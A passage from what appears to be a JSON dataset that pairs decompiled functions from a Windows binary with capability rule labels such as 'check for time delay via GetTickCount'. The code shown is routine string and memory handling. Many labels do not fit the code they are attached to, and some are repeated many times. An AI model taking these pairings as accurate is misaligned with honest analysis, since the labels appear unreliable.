fcn.1400305e0(&puStack88, iVar5, iVar1, 0);\n    *(arg3 + 0x28) = iVar5;\n    *(iVar5 + -2 + iVar4) = 0;\n    *(arg3 + 0x30) = iVar1;\n    if (puStack88 != auStack72) {\n        fcn.1400bc6c0();\n    }\n    (**(*arg2 + 0x30))(&puStack88, arg2);\n    iVar1 = iStack80;\n    if (iStack80 + 1U < 0x3ffffffffffffffd) {\n        iVar4 = (iStack80 + 1U) * 2;\n        iVar5 = fcn.1400bc6e0(iVar4);\n        fcn.1400305e0(&puStack88, iVar5, iVar1, 0);\n        *(arg3 + 0x38) = iVar5;\n        *(iVar5 + -2 + iVar4) = 0;\n        *(arg3 + 0x40) = iVar1;\n        if (puStack88 != auStack72) {\n            fcn.1400bc6c0();\n        }\n        (**(*arg2 + 0x38))(&puStack88, arg2);\n        if (iStack80 + 1U < 0x3ffffffffffffffd) {\n            iVar1 = (iStack80 + 1U) * 2;\n            iVar4 = fcn.1400bc6e0(iVar1);\n            fcn.1400305e0(&puStack88, iVar4, iStack80, 0);\n            *(arg3 + 0x48) = iVar4;\n            *(iVar4 + -2 + iVar1) = 0;\n            *(arg3 + 0x50) = iStack80;\n            if (puStack88 != auStack72) {\n                fcn.1400bc6c0();\n            }\n            uVar3 = (**(*arg2 + 0x48))(arg2);\n            *(arg3 + 0x5c) = uVar3;\n            uVar3 = (**(*arg2 + 0x50))(arg2);\n            *(arg3 + 0x60) = uVar3;\n            return;\n        }\n        arg1 = fcn.1400bd850();\n    }\n    else {\n        arg1 = fcn.1400bd850();\n    }\n    do {\n        if (puStack88 != auStack72) {\n            fcn.1400bc6c0();\n        }\n        arg1 = fcn.140014f30(arg1);\n    } while( true );\n}\n",
        "token_count": 1209
    },
    "1400a5a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a5a00(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t **hSemaphore;\n    ulong *arg1_00;\n    int32_t **ppiVar4;\n    int32_t *piVar5;\n    \n    *arg1 = NULL;\n    fcn.1400a29d0();\n    ppiVar2 = *0x14010ff90;\n    ppiVar4 = *0x14010ff50;\n    piVar1 = **0x14010ff90;\n    *arg1 = piVar1;\n    if (piVar1 == *ppiVar4) {\n        return;\n    }\n    hSemaphore = fcn.14001fee0();\n    piVar1 = *0x14010fc90;\n    ppiVar4 = hSemaphore;\n    if (**0x14010fc90 != 0) goto code_r0x0001400a5aa0;\n    piVar5 = *ppiVar2;\n    do {\n        *piVar5 = *piVar5 + 1;\n        while( true ) {\n            iVar3 = *piVar1;\n            *arg1 = piVar5;\n            if (iVar3 == 0) {\n                return;\n            }\n            iVar3 = fcn.1400149e0(hSemaphore);\n            if (iVar3 == 0) {\n                return;\n            }\n            arg1_00 = fcn.1400bc7f0(8);\n            *arg1_00 = 0x140116340;\n            ppiVar4 = fcn.1400bcdb0(arg1_00, 0x140111900, 0x140021a60);\ncode_r0x0001400a5aa0:\n            iVar3 = fcn.140014970(ppiVar4);\n            if (iVar3 != 0) {\n                fcn.140021dc0();\n                fcn.140014f30(ppiVar4);\n                piVar1 = *ppiVar4;\n                if (piVar1 != *0x140108760) {\n                    if (**0x14010fc90 == 0) {\n                        iVar3 = *piVar1;\n                        *piVar1 = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        fcn.1400a5480(piVar1);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (*_sym.imp.msvcrt.dll_free)(piVar1);\n                        return;\n                    }\n                }\n                return;\n            }\n            piVar5 = *ppiVar2;\n            if (*piVar1 == 0) break;\n            LOCK();\n            *piVar5 = *piVar5 + 1;\n            piVar5 = *ppiVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 680
    },
    "14009c21": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.14009c210(int64_t *arg1, int16_t *arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    if (0 < arg3) {\n        while( true ) {\n            iVar3 = arg1[2];\n            if (arg1[3] != iVar3) {\n                iVar4 = arg1[3] - iVar3 >> 1;\n                if (arg3 - iVar5 < iVar4) {\n                    iVar4 = arg3 - iVar5;\n                }\n                if (iVar4 != 0) {\n                    sub.msvcrt.dll_memcpy(arg2, iVar3, iVar4 * 2);\n                    iVar3 = arg1[2];\n                }\n                iVar5 = iVar5 + iVar4;\n                arg2 = arg2 + iVar4;\n                arg1[2] = iVar3 + iVar4 * 2;\n            }\n            if (arg3 <= iVar5) break;\n            pcVar1 = *(*arg1 + 0x50);\n            if (pcVar1 == 0x14009bfd0) {\n                pcVar1 = *(*arg1 + 0x48);\n                if (pcVar1 == 0x14009c5c0) {\n                    return iVar5;\n                }\n                iVar2 = (*pcVar1)(arg1);\n                if (iVar2 == -1) {\n                    return iVar5;\n                }\n                iVar2 = *arg1[2];\n                arg1[2] = arg1[2] + 1;\n            }\n            else {\n                iVar2 = (*pcVar1)(arg1);\n            }\n            if (iVar2 == -1) {\n                return iVar5;\n            }\n            iVar5 = iVar5 + 1;\n            *arg2 = iVar2;\n            arg2 = arg2 + 1;\n            if (arg3 <= iVar5) {\n                return iVar5;\n            }\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 457
    },
    "1400a0dc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a0dc0(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t arg3;\n    uint64_t arg3_00;\n    uint64_t arg3_01;\n    bool bVar4;\n    ushort uVar5;\n    uint uVar6;\n    int64_t *piVar7;\n    ulong uVar8;\n    char *arg2_00;\n    int64_t iVar9;\n    int64_t iStack112;\n    int64_t iStack104;\n    ulong uStack96;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar7 = fcn.1400b9670(arg2);\n    if (*(*piVar7 + 0x28) == 0x140026270) {\n        iVar9 = -2;\n        iVar3 = *(piVar7[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n            iVar9 = iVar3 + iVar9 * 2;\n        }\n        aiStack80[0] = fcn.1400725d0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x28))(aiStack80, piVar7);\n    }\n    arg3 = *(aiStack80[0] + -0x18);\n    if (arg3 < 0x3ffffffffffffffd) {\n        iStack112 = fcn.1400bc6e0(arg3 * 2);\n        fcn.140023e10(aiStack80, iStack112, arg3, 0);\n        if (**0x14010fc90 == 0) {\n            iVar2 = *(aiStack80[0] + -8);\n            *(aiStack80[0] + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = aiStack80[0] + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.140072a10(aiStack80[0] + -0x18, &uStack81);\n        }\n        if (*(*piVar7 + 0x30) == 0x140026330) {\n            iVar9 = -2;\n            iVar3 = *(piVar7[2] + 0x38);\n            if (iVar3 != 0) {\n                iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                iVar9 = iVar3 + iVar9 * 2;\n            }\n            aiStack80[0] = fcn.1400725d0(iVar3, iVar9);\n        }\n        else {\n            (**(*piVar7 + 0x30))(aiStack80, piVar7);\n        }\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (arg3_00 < 0x3ffffffffffffffd) {\n            iStack104 = fcn.1400bc6e0(arg3_00 * 2);\n            fcn.140023e10(aiStack80, iStack104, arg3_00, 0);\n            if (**0x14010fc90 == 0) {\n                iVar2 = *(aiStack80[0] + -8);\n                *(aiStack80[0] + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = aiStack80[0] + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.140072a10(aiStack80[0] + -0x18, &uStack81);\n            }\n            if (*(*piVar7 + 0x38) == 0x1400262e0) {\n                iVar9 = -2;\n                iVar3 = *(piVar7[2] + 0x48);\n                if (iVar3 != 0) {\n                    iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                    iVar9 = iVar3 + iVar9 * 2;\n                }\n                aiStack80[0] = fcn.1400725d0(iVar3, iVar9);\n            }\n            else {\n                (**(*piVar7 + 0x38))(aiStack80, piVar7);\n            }\n            arg3_01 = *(aiStack80[0] + -0x18);\n            if (arg3_01 < 0x3ffffffffffffffd) {\n                uVar8 = fcn.1400bc6e0(arg3_01 * 2);\n                fcn.140023e10(aiStack80, uVar8, arg3_01, 0);\n                if (**0x14010fc90 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.140072a10(aiStack80[0] + -0x18, &uStack81);\n                }\n                if (*(*piVar7 + 0x20) == 0x140026090) {\n                    iVar9 = -1;\n                    iVar3 = *(piVar7[2] + 0x10);\n                    if (iVar3 != 0) {\n                        iVar9 = sub.msvcrt.dll_strlen(iVar3);\n                        iVar9 = iVar3 + iVar9;\n                    }\n                    aiStack80[0] = fcn.14007bae0(iVar3, iVar9);\n                }\n                else {\n                    (**(*piVar7 + 0x20))(aiStack80, piVar7);\n                }\n                iVar9 = *(aiStack80[0] + -0x18);\n                arg2_00 = fcn.1400bc6e0(iVar9);\n                fcn.140024ea0(aiStack80, arg2_00, iVar9, 0);\n                *(arg1 + 0x10) = arg2_00;\n                bVar4 = false;\n                *(arg1 + 0x18) = iVar9;\n                if (iVar9 != 0) {\n                    bVar4 = *arg2_00 - 1U < 0x7e;\n                }\n                iVar9 = *piVar7;\n                *(arg1 + 0x20) = bVar4;\n                if (*(iVar9 + 0x10) == 0x1400262d0) {\n                    uVar5 = *(piVar7[2] + 0x22);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x10))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x22) = uVar5;\n                if (*(iVar9 + 0x18) == 0x140026380) {\n                    uVar5 = *(piVar7[2] + 0x24);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x18))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x24) = uVar5;\n                *(arg1 + 0x30) = arg3;\n                *(arg1 + 0x28) = iStack112;\n                *(arg1 + 0x40) = arg3_00;\n                *(arg1 + 0x38) = iStack104;\n                *(arg1 + 0x50) = arg3_01;\n                *(arg1 + 0x48) = uVar8;\n                if (*(iVar9 + 0x40) == 0x1400262c0) {\n                    uVar6 = *(piVar7[2] + 0x58);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x40))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x58) = uVar6;\n                if (*(iVar9 + 0x48) == 0x140026150) {\n                    uVar6 = *(piVar7[2] + 0x5c);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x48))(piVar7);\n                }\n                *(arg1 + 0x5c) = uVar6;\n                if (*(*piVar7 + 0x50) == 0x140026140) {\n                    uVar6 = *(piVar7[2] + 0x60);\n                }\n                else {\n                    uVar6 = (**(*piVar7 + 0x50))(piVar7);\n                }\n                *(arg1 + 0x60) = uVar6;\n                piVar7 = fcn.1400b9850(arg2);\n                (**(*piVar7 + 0x58))(piVar7, **0x14010fdf0, **0x14010fdf0 + 0xb, arg1 + 100);\n                piVar1 = *0x14010fc90;\n                *(arg1 + 0x7a) = 1;\n                if (*piVar1 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n                }\n                return;\n            }\n            uVar8 = fcn.1400bd850();\n            fcn.1400bc6b0(iStack104);\n            goto code_r0x0001400a1312;\n        }\n    }\n    else {\n        fcn.1400bd850();\n    }\n    uVar8 = fcn.1400bd850();\ncode_r0x0001400a1312:\n    do {\n        fcn.1400bc6b0(iStack112);\n        do {\n            uVar8 = fcn.140014f30(uVar8);\n            fcn.14007bf20(aiStack80[0] + -0x18);\n            fcn.1400bc6b0(uStack96);\n            if (iStack104 != 0) {\n                fcn.1400bc6b0(iStack104);\n            }\n        } while (iStack112 == 0);\n    } while( true );\n}\n",
        "token_count": 2448
    },
    "1400a15e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a15e0(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t arg3;\n    uint64_t arg3_00;\n    uint64_t arg3_01;\n    bool bVar4;\n    ushort uVar5;\n    uint uVar6;\n    int64_t *piVar7;\n    ulong uVar8;\n    char *arg2_00;\n    int64_t iVar9;\n    int64_t iStack112;\n    int64_t iStack104;\n    ulong uStack96;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar7 = fcn.1400b96d0(arg2);\n    if (*(*piVar7 + 0x28) == 0x1400266b0) {\n        iVar9 = -2;\n        iVar3 = *(piVar7[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n            iVar9 = iVar3 + iVar9 * 2;\n        }\n        aiStack80[0] = fcn.1400725d0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x28))(aiStack80, piVar7);\n    }\n    arg3 = *(aiStack80[0] + -0x18);\n    if (arg3 < 0x3ffffffffffffffd) {\n        iStack112 = fcn.1400bc6e0(arg3 * 2);\n        fcn.140023e10(aiStack80, iStack112, arg3, 0);\n        if (**0x14010fc90 == 0) {\n            iVar2 = *(aiStack80[0] + -8);\n            *(aiStack80[0] + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = aiStack80[0] + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.140072a10(aiStack80[0] + -0x18, &uStack81);\n        }\n        if (*(*piVar7 + 0x30) == 0x140026770) {\n            iVar9 = -2;\n            iVar3 = *(piVar7[2] + 0x38);\n            if (iVar3 != 0) {\n                iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                iVar9 = iVar3 + iVar9 * 2;\n            }\n            aiStack80[0] = fcn.1400725d0(iVar3, iVar9);\n        }\n        else {\n            (**(*piVar7 + 0x30))(aiStack80, piVar7);\n        }\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (arg3_00 < 0x3ffffffffffffffd) {\n            iStack104 = fcn.1400bc6e0(arg3_00 * 2);\n            fcn.140023e10(aiStack80, iStack104, arg3_00, 0);\n            if (**0x14010fc90 == 0) {\n                iVar2 = *(aiStack80[0] + -8);\n                *(aiStack80[0] + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = aiStack80[0] + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.140072a10(aiStack80[0] + -0x18, &uStack81);\n            }\n            if (*(*piVar7 + 0x38) == 0x140026720) {\n                iVar9 = -2;\n                iVar3 = *(piVar7[2] + 0x48);\n                if (iVar3 != 0) {\n                    iVar9 = sub.msvcrt.dll_wcslen(iVar3);\n                    iVar9 = iVar3 + iVar9 * 2;\n                }\n                aiStack80[0] = fcn.1400725d0(iVar3, iVar9);\n            }\n            else {\n                (**(*piVar7 + 0x38))(aiStack80, piVar7);\n            }\n            arg3_01 = *(aiStack80[0] + -0x18);\n            if (arg3_01 < 0x3ffffffffffffffd) {\n                uVar8 = fcn.1400bc6e0(arg3_01 * 2);\n                fcn.140023e10(aiStack80, uVar8, arg3_01, 0);\n                if (**0x14010fc90 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.140072a10(aiStack80[0] + -0x18, &uStack81);\n                }\n                if (*(*piVar7 + 0x20) == 0x1400264d0) {\n                    iVar9 = -1;\n                    iVar3 = *(piVar7[2] + 0x10);\n                    if (iVar3 != 0) {\n                        iVar9 = sub.msvcrt.dll_strlen(iVar3);\n                        iVar9 = iVar3 + iVar9;\n                    }\n                    aiStack80[0] = fcn.14007bae0(iVar3, iVar9);\n                }\n                else {\n                    (**(*piVar7 + 0x20))(aiStack80, piVar7);\n                }\n                iVar9 = *(aiStack80[0] + -0x18);\n                arg2_00 = fcn.1400bc6e0(iVar9);\n                fcn.140024ea0(aiStack80, arg2_00, iVar9, 0);\n                *(arg1 + 0x10) = arg2_00;\n                bVar4 = false;\n                *(arg1 + 0x18) = iVar9;\n                if (iVar9 != 0) {\n                    bVar4 = *arg2_00 - 1U < 0x7e;\n                }\n                iVar9 = *piVar7;\n                *(arg1 + 0x20) = bVar4;\n                if (*(iVar9 + 0x10) == 0x140026710) {\n                    uVar5 = *(piVar7[2] + 0x22);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x10))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x22) = uVar5;\n                if (*(iVar9 + 0x18) == 0x1400267c0) {\n                    uVar5 = *(piVar7[2] + 0x24);\n                }\n                else {\n                    uVar5 = (**(iVar9 + 0x18))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x24) = uVar5;\n                *(arg1 + 0x30) = arg3;\n                *(arg1 + 0x28) = iStack112;\n                *(arg1 + 0x40) = arg3_00;\n                *(arg1 + 0x38) = iStack104;\n                *(arg1 + 0x50) = arg3_01;\n                *(arg1 + 0x48) = uVar8;\n                if (*(iVar9 + 0x40) == 0x140026700) {\n                    uVar6 = *(piVar7[2] + 0x58);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x40))(piVar7);\n                    iVar9 = *piVar7;\n                }\n                *(arg1 + 0x58) = uVar6;\n                if (*(iVar9 + 0x48) == 0x140026590) {\n                    uVar6 = *(piVar7[2] + 0x5c);\n                }\n                else {\n                    uVar6 = (**(iVar9 + 0x48))(piVar7);\n                }\n                *(arg1 + 0x5c) = uVar6;\n                if (*(*piVar7 + 0x50) == 0x140026580) {\n                    uVar6 = *(piVar7[2] + 0x60);\n                }\n                else {\n                    uVar6 = (**(*piVar7 + 0x50))(piVar7);\n                }\n                *(arg1 + 0x60) = uVar6;\n                piVar7 = fcn.1400b9850(arg2);\n                (**(*piVar7 + 0x58))(piVar7, **0x14010fdf0, **0x14010fdf0 + 0xb, arg1 + 100);\n                piVar1 = *0x14010fc90;\n                *(arg1 + 0x7a) = 1;\n                if (*piVar1 == 0) {\n                    iVar2 = *(aiStack80[0] + -8);\n                    *(aiStack80[0] + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = aiStack80[0] + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n                }\n                return;\n            }\n            uVar8 = fcn.1400bd850();\n            fcn.1400bc6b0(iStack104);\n            goto code_r0x0001400a1b32;\n        }\n    }\n    else {\n        fcn.1400bd850();\n    }\n    uVar8 = fcn.1400bd850();\ncode_r0x0001400a1b32:\n    do {\n        fcn.1400bc6b0(iStack112);\n        do {\n            uVar8 = fcn.140014f30(uVar8);\n            fcn.14007bf20(aiStack80[0] + -0x18);\n            fcn.1400bc6b0(uStack96);\n            if (iStack104 != 0) {\n                fcn.1400bc6b0(iStack104);\n            }\n        } while (iStack112 == 0);\n    } while( true );\n}\n",
        "token_count": 2451
    },
    "1400a70a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a70a0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    ulong var_10h;\n    ulong var_18h;\n    ulong var_20h;\n    ulong var_18h_2;\n    uint64_t var_10h_2;\n    ulong var_8h;\n    \n    var_10h_2 = fcn.1400b8050(arg2, arg3);\n    if (var_10h_2 < 0x10) {\n        var_8h = arg1;\n        fcn.1400a75f0(arg1);\n    }\n    else {\n        uVar1 = fcn.1400a9310(arg1, &var_10h_2, 0);\n        fcn.1400a86c0(arg1, uVar1);\n        fcn.1400a6e40(arg1, var_10h_2);\n    }\n    fcn.1400bc660(&var_18h_2, arg1);\n    uVar1 = fcn.14002fcc0(arg1);\n    fcn.1400a7650(uVar1, arg2, arg3);\n    var_18h_2 = 0;\n    fcn.1400a7600(arg1, var_10h_2);\n    fcn.1400bc680(&var_18h_2);\n    return;\n}\n",
        "token_count": 314
    },
    "1400a867": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a8670(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t arg2_00;\n    \n    arg2_00 = arg1[1];\n    if (arg2 <= arg2_00) {\n        if (arg2 < arg2_00) {\n            arg1[1] = arg2;\n            *(*arg1 + arg2) = 0;\n        }\n        return;\n    }\n    fcn.1400a76a0(arg1, arg2_00, 0, arg2 - arg2_00);\n    return;\n}\n",
        "token_count": 131
    },
    "1400a8ee": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400a8ee0(int64_t **arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t **ppiVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    \n    ppiVar5 = *arg1;\n    ppiVar1 = arg1 + 2;\n    if (ppiVar5 == ppiVar1) {\n        return;\n    }\n    piVar2 = arg1[1];\n    if (piVar2 < 0x10) {\n        uVar8 = piVar2 + 1;\n        uVar3 = uVar8;\n        if (piVar2 == NULL) {\n            *(arg1 + 2) = *ppiVar5;\n            goto code_r0x0001400a8f40;\n        }\n        if (7 < uVar3) {\n            arg1[2] = *ppiVar5;\n            *(arg1 + (uVar8 & 0xffffffff) + 8) = *(ppiVar5 + ((uVar8 & 0xffffffff) - 8));\n            iVar7 = ppiVar1 - (arg1 + 3 & 0xfffffffffffffff8);\n            uVar3 = uVar3 + iVar7 & 0xfffffff8;\n            if (7 < uVar3) {\n                uVar6 = 0;\n                do {\n                    uVar8 = uVar6;\n                    uVar6 = uVar6 + 8;\n                    *((arg1 + 3 & 0xfffffffffffffff8) + uVar8) = *(ppiVar5 + (uVar8 - iVar7));\n                } while (uVar6 < uVar3);\n            }\n            goto code_r0x0001400a8f40;\n        }\n        if ((uVar8 & 4) == 0) {\n            if ((uVar3 != 0) && (*(arg1 + 2) = *ppiVar5,  (uVar8 & 2) != 0)) {\n                *(arg1 + (uVar8 & 0xffffffff) + 0xe) = *(ppiVar5 + ((uVar8 & 0xffffffff) - 2));\n            }\n            goto code_r0x0001400a8f40;\n        }\n    }\n    else {\n        if (arg1[2] <= piVar2) {\n            return;\n        }\n        iVar7 = piVar2 + 1;\n        if (-1 < iVar7) {\n            piVar4 = fcn.1400bc710(iVar7);\n            ppiVar5 = *arg1;\n            sub.msvcrt.dll_memcpy(piVar4, ppiVar5, iVar7);\n            if (ppiVar1 != ppiVar5) {\n                fcn.1400bc6c0(ppiVar5);\n            }\n            *arg1 = piVar4;\n            arg1[2] = piVar2;\n            return;\n        }\n        uVar3 = fcn.1400bd170();\n    }\n    *(arg1 + 2) = *ppiVar5;\n    *(arg1 + uVar3 + 0xc) = *(ppiVar5 + (uVar3 - 4));\ncode_r0x0001400a8f40:\n    fcn.1400bc6c0();\n    *arg1 = ppiVar1;\n    return;\n}\n",
        "token_count": 760
    },
    "1400a908": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a9080(ulong *arg1, uint64_t arg2)\n\n{\n    ulong *puVar1;\n    uchar *puVar2;\n    uint64_t arg3;\n    uint64_t auStackX16 [3];\n    \n    if (arg1 + 2 == *arg1) {\n        arg3 = 0xf;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg2 <= arg3) {\n        return;\n    }\n    auStackX16[0] = arg2;\n    puVar2 = fcn.1400a9310(arg1, auStackX16, arg3);\n    puVar1 = *arg1;\n    if (arg1[1] == 0) {\n        *puVar2 = *puVar1;\n    }\n    else if (arg1[1] != -1) {\n        sub.msvcrt.dll_memcpy(puVar2, puVar1);\n    }\n    if (arg1 + 2 != puVar1) {\n        fcn.1400bc6c0(puVar1);\n    }\n    *arg1 = puVar2;\n    arg1[2] = auStackX16[0];\n    return;\n}\n",
        "token_count": 270
    },
    "1400a931": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.1400a9310(ulong noname_0, uint64_t *arg2, uint64_t arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    ulong uVar3;\n    char cVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    code *pcVar7;\n    int64_t *piVar8;\n    int64_t **ppiVar9;\n    ulong arg1;\n    uint64_t uVar10;\n    ulong *puVar11;\n    int64_t iVar12;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    uVar10 = *arg2;\n    if (0x3fffffffffffffff < uVar10) {\n        iVar12 = 0x14010bae0;\n        puVar6 = fcn.1400bd360(0x14010bae0);\n        *(iVar12 + 8) = arg2;\n        return puVar6;\n    }\n    iVar12 = uVar10 + 1;\n    if ((arg3 < uVar10) && (arg3 = arg3 * 2,  uVar10 < arg3)) {\n        if (arg3 < 0x4000000000000000) {\n            iVar12 = arg3 + 1;\n            *arg2 = arg3;\n        }\n        else {\n            iVar12 = 0x4000000000000000;\n            *arg2 = 0x3fffffffffffffff;\n        }\n    }\n    iVar5 = 1;\n    if (iVar12 != 0) {\n        iVar5 = iVar12;\n    }\n    while( true ) {\n        puVar6 = sub.msvcrt.dll_malloc(iVar5);\n        if (puVar6 != NULL) {\n            return puVar6;\n        }\n        pcVar7 = fcn.1400b66b0();\n        if (pcVar7 == NULL) break;\n        (*pcVar7)();\n    }\n    piVar8 = fcn.1400bc7f0(8);\n    *piVar8 = *0x140110790 + 0x10;\n    fcn.1400bcdb0(piVar8, 0x1401135d0, fcn.1400b4730);\n    puVar6 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar6 == NULL) {\n        iVar12 = 0x90;\n        puVar6 = fcn.140020150(0x90);\n        if (puVar6 == NULL) {\n            fcn.1400b8f90();\n            piVar8 = iVar12 + 0xa0;\n            puVar6 = sub.msvcrt.dll_malloc();\n            if ((puVar6 != NULL) || (puVar6 = fcn.140020150(piVar8),  puVar6 != NULL)) {\n                *puVar6 = 0;\n                puVar6[0x13] = 0;\n                puVar11 = puVar6 + 1 & 0xfffffffffffffff8;\n                for (uVar10 = (puVar6 - (puVar6 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar10 != 0;\n                    uVar10 = uVar10 - 1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                return puVar6 + 0x14;\n            }\n            fcn.1400b8f90();\n            ppiVar9 = fcn.1400bcb60();\n            piVar1 = piVar8 + -10;\n            piStack240 = *ppiVar9;\n            if (*piVar8 + 